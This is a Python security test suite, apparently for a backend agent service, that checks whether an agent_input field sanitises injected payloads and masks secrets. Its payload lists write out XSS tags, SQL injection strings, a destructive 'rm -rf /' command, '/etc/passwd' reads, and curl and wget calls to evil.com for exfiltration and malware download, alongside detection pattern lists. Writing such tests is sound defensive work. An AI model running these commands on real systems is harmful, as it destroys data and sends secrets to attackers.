"""
Issue #1017 Security Vulnerability Tests: Agent Input Injection - CORE VULNERABILITIES

CRITICAL SECURITY TEST SUITE: These tests are designed to FAIL initially to prove
security vulnerabilities exist in the agent_input field processing.

FOCUS: Core vulnerabilities without complex model dependencies
1. Agent input injection vulnerability (malicious payload preservation)
2. Basic serialization exposure testing
3. Simple XSS/SQL/Command injection detection

REQUIREMENTS:
- Tests MUST FAIL initially to prove vulnerabilities exist
- Uses SSOT test infrastructure with unittest compatibility
- Focuses on agent_input field specifically
- Simple test structure for clear vulnerability demonstration

Business Value: Enterprise/Platform - Security compliance for HIPAA, SOC2, SEC regulations
"""

import json
import uuid
import unittest
from typing import Dict, Any

from test_framework.ssot.base_test_case import SSotBaseTestCase
from netra_backend.app.schemas.agent_models import DeepAgentState


class TestIssue1017AgentInputInjectionCore(SSotBaseTestCase, unittest.TestCase):
    """
    Core agent input injection vulnerability tests for Issue #1017.

    These tests are designed to FAIL initially to prove that security
    vulnerabilities exist in the agent_input field processing.

    FOCUS: Demonstrating that malicious payloads injected into agent_input
    are preserved and not sanitized during processing.
    """

    def setUp(self):
        """Setup for each test method - unittest style."""
        super().setUp()  # Calls SSOT setup_method automatically
        self._setup_vulnerability_test_context()

    def setup_method(self, method):
        """Setup for each test method - pytest style."""
        super().setup_method(method)
        self._setup_vulnerability_test_context()

    def _setup_vulnerability_test_context(self):
        """Common setup for vulnerability testing."""
        self.test_user_id = f"core_vuln_user_{uuid.uuid4().hex[:8]}"
        self.test_thread_id = f"core_vuln_thread_{uuid.uuid4().hex[:8]}"
        self.test_run_id = f"core_vuln_run_{uuid.uuid4().hex[:8]}"

        # Record business value metrics
        self.record_metric("test_category", "security_vulnerability")
        self.record_metric("issue_number", "1017")
        self.record_metric("vulnerability_type", "agent_input_injection")

    def test_agent_input_malicious_payload_preservation(self):
        """
        Test that malicious payloads in agent_input are preserved without sanitization.

        EXPECTS TO FAIL: This test should demonstrate that malicious payloads
        injected into agent_input fields are preserved in the model state,
        proving that no input sanitization is occurring.
        """
        self.record_metric("vulnerability_subtype", "payload_preservation")

        # Critical malicious payloads that should be sanitized but aren't
        malicious_payloads = [
            "<script>alert('XSS')</script>",
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "__import__('os').system('rm -rf /')",
            "; curl http://evil.com/exfiltrate?data="
        ]

        for i, payload in enumerate(malicious_payloads):
            with self.subTest(payload_index=i, payload_type=payload[:20]):

                # Create DeepAgentState with malicious payload in agent_input
                vulnerable_state = DeepAgentState(
                    user_request="Process this request",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_payload_{i}",
                    agent_input={
                        "malicious_field": payload,
                        "nested_injection": {
                            "deep_payload": payload
                        }
                    }
                )

                # Use model_dump() to get dictionary representation (avoids datetime JSON issues)
                state_dict = vulnerable_state.model_dump()
                agent_input_dict = state_dict.get("agent_input", {})

                # VULNERABILITY CHECK: If this passes, malicious payloads are being preserved
                # These assertions should FAIL to prove vulnerability exists
                self.assertNotIn(payload, str(agent_input_dict),
                    f"VULNERABILITY: Malicious payload '{payload}' was preserved in agent_input without sanitization")

                # Check specific fields within agent_input
                if "malicious_field" in agent_input_dict:
                    self.assertNotEqual(agent_input_dict["malicious_field"], payload,
                        f"VULNERABILITY: Malicious payload '{payload}' preserved in malicious_field")

                if "nested_injection" in agent_input_dict and isinstance(agent_input_dict["nested_injection"], dict):
                    nested_dict = agent_input_dict["nested_injection"]
                    if "deep_payload" in nested_dict:
                        self.assertNotEqual(nested_dict["deep_payload"], payload,
                            f"VULNERABILITY: Malicious payload '{payload}' preserved in nested injection")

    def test_agent_input_xss_injection_vulnerability(self):
        """
        Test XSS injection vulnerability in agent_input.

        EXPECTS TO FAIL: This test should demonstrate that XSS payloads
        are not sanitized in agent_input processing.
        """
        self.record_metric("vulnerability_subtype", "xss_injection")

        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]

        for payload in xss_payloads:
            with self.subTest(xss_payload=payload):

                # Create state with XSS payload in agent_input
                state = DeepAgentState(
                    user_request="Analyze data",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_xss",
                    agent_input={
                        "user_content": payload,
                        "description": f"Content: {payload}"
                    }
                )

                state_dict = state.model_dump()
                agent_input_str = str(state_dict.get("agent_input", {}))

                # VULNERABILITY CHECK: XSS patterns should be sanitized
                # These assertions should FAIL to prove vulnerability exists
                dangerous_patterns = ["<script>", "<img", "javascript:", "<svg", "onerror=", "onload="]
                for pattern in dangerous_patterns:
                    if pattern in payload:
                        self.assertNotIn(pattern, agent_input_str,
                            f"VULNERABILITY: XSS pattern '{pattern}' was not sanitized in agent_input")

    def test_agent_input_sql_injection_vulnerability(self):
        """
        Test SQL injection vulnerability in agent_input.

        EXPECTS TO FAIL: This test should demonstrate that SQL injection payloads
        are not sanitized in agent_input processing.
        """
        self.record_metric("vulnerability_subtype", "sql_injection")

        sql_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM secrets --",
            "admin'--"
        ]

        for payload in sql_payloads:
            with self.subTest(sql_payload=payload):

                # Create state with SQL injection payload in agent_input
                state = DeepAgentState(
                    user_request="Query data",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_sql",
                    agent_input={
                        "query": payload,
                        "filter": payload
                    }
                )

                state_dict = state.model_dump()
                agent_input_str = str(state_dict.get("agent_input", {}))

                # VULNERABILITY CHECK: SQL injection patterns should be sanitized
                # These assertions should FAIL to prove vulnerability exists
                dangerous_sql_patterns = ["DROP TABLE", "UNION SELECT", "' OR '", "'--", "'; "]
                for pattern in dangerous_sql_patterns:
                    if pattern in payload:
                        self.assertNotIn(pattern, agent_input_str,
                            f"VULNERABILITY: SQL injection pattern '{pattern}' was not sanitized in agent_input")

    def test_agent_input_command_injection_vulnerability(self):
        """
        Test command injection vulnerability in agent_input.

        EXPECTS TO FAIL: This test should demonstrate that command injection payloads
        are not sanitized in agent_input processing.
        """
        self.record_metric("vulnerability_subtype", "command_injection")

        command_payloads = [
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget http://evil.com/malware",
            "`whoami`"
        ]

        for payload in command_payloads:
            with self.subTest(command_payload=payload):

                # Create state with command injection payload in agent_input
                state = DeepAgentState(
                    user_request="Execute command",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_cmd",
                    agent_input={
                        "command": payload,
                        "script": payload
                    }
                )

                state_dict = state.model_dump()
                agent_input_str = str(state_dict.get("agent_input", {}))

                # VULNERABILITY CHECK: Command injection patterns should be sanitized
                # These assertions should FAIL to prove vulnerability exists
                dangerous_cmd_patterns = ["; ", "| ", "&& ", "`", "rm -rf", "wget", "/etc/passwd"]
                for pattern in dangerous_cmd_patterns:
                    if pattern in payload:
                        self.assertNotIn(pattern, agent_input_str,
                            f"VULNERABILITY: Command injection pattern '{pattern}' was not sanitized in agent_input")

    def test_agent_input_sensitive_data_exposure(self):
        """
        Test that sensitive data in agent_input gets exposed in serialization.

        EXPECTS TO FAIL: This test should demonstrate that sensitive credentials
        placed in agent_input are exposed during model serialization.
        """
        self.record_metric("vulnerability_subtype", "sensitive_data_exposure")

        # Sensitive data that should be masked/filtered in serialization
        sensitive_data = {
            "api_key": "sk-super_secret_openai_key_12345",
            "password": "ultra_secret_password_67890",
            "token": "bearer_token_should_not_leak_abc123"
        }

        for secret_type, secret_value in sensitive_data.items():
            with self.subTest(secret_type=secret_type):

                # Create state with sensitive data in agent_input
                state = DeepAgentState(
                    user_request="Process credentials",
                    user_id=self.test_user_id,
                    chat_thread_id=self.test_thread_id,
                    run_id=f"{self.test_run_id}_sensitive",
                    agent_input={
                        "credentials": {
                            secret_type: secret_value
                        },
                        "config": {
                            "auth": secret_value,
                            "secret": secret_value
                        }
                    }
                )

                state_dict = state.model_dump()

                # VULNERABILITY CHECK: Sensitive data should be masked/filtered
                # This assertion should FAIL to prove vulnerability exists
                self.assertNotIn(secret_value, str(state_dict),
                    f"VULNERABILITY: Sensitive {secret_type} '{secret_value}' was exposed in model serialization")

                # Check agent_input specifically
                agent_input_str = str(state_dict.get("agent_input", {}))
                self.assertNotIn(secret_value, agent_input_str,
                    f"VULNERABILITY: Sensitive {secret_type} '{secret_value}' was exposed in agent_input")

    def test_agent_input_cross_user_contamination(self):
        """
        Test for cross-user data contamination in agent_input processing.

        EXPECTS TO FAIL: This test should demonstrate that data from one user
        can contaminate another user's agent_input processing.
        """
        self.record_metric("vulnerability_subtype", "cross_user_contamination")

        # Create two users with private data
        user1_id = f"user1_{uuid.uuid4().hex[:8]}"
        user2_id = f"user2_{uuid.uuid4().hex[:8]}"
        user1_secret = f"user1_private_{uuid.uuid4().hex[:8]}"
        user2_secret = f"user2_private_{uuid.uuid4().hex[:8]}"

        # Create state for user 1
        user1_state = DeepAgentState(
            user_request="User 1 request",
            user_id=user1_id,
            chat_thread_id=f"thread_{user1_id}",
            run_id=f"run_{user1_id}",
            agent_input={
                "private_data": user1_secret,
                "user_secret": user1_secret
            }
        )

        # Create state for user 2
        user2_state = DeepAgentState(
            user_request="User 2 request",
            user_id=user2_id,
            chat_thread_id=f"thread_{user2_id}",
            run_id=f"run_{user2_id}",
            agent_input={
                "private_data": user2_secret,
                "user_secret": user2_secret
            }
        )

        # Test that each user's data doesn't contaminate the other
        for i, (state, current_secret, other_secret, current_user, other_user) in enumerate([
            (user1_state, user1_secret, user2_secret, user1_id, user2_id),
            (user2_state, user2_secret, user1_secret, user2_id, user1_id)
        ]):
            with self.subTest(user_index=i, current_user=current_user):

                state_dict = state.model_dump()
                state_str = str(state_dict)

                # VULNERABILITY CHECK: Other user's data should not appear
                # This assertion should FAIL to prove vulnerability exists
                self.assertNotIn(other_secret, state_str,
                    f"VULNERABILITY: User {other_user}'s secret '{other_secret}' contaminated user {current_user}'s state")

                self.assertNotIn(other_user, state_str,
                    f"VULNERABILITY: Other user ID '{other_user}' appeared in user {current_user}'s state")

                # Verify current user's data is present (sanity check)
                self.assertIn(current_secret, state_str,
                    f"INTERNAL ERROR: Current user's secret '{current_secret}' missing from their own state")

    def tearDown(self):
        """Cleanup after each test method - unittest style."""
        try:
            # Record final vulnerability test metrics
            total_metrics = self.get_all_metrics()
            self.record_metric("total_core_vulnerability_tests", len([k for k in total_metrics.keys() if k.startswith("vulnerability_")]))

        finally:
            super().tearDown()  # Calls SSOT teardown_method automatically

    def teardown_method(self, method):
        """Cleanup after each test method - pytest style."""
        try:
            # Record final vulnerability test metrics
            total_metrics = self.get_all_metrics()
            self.record_metric("total_core_vulnerability_tests", len([k for k in total_metrics.keys() if k.startswith("vulnerability_")]))

        finally:
            super().teardown_method(method)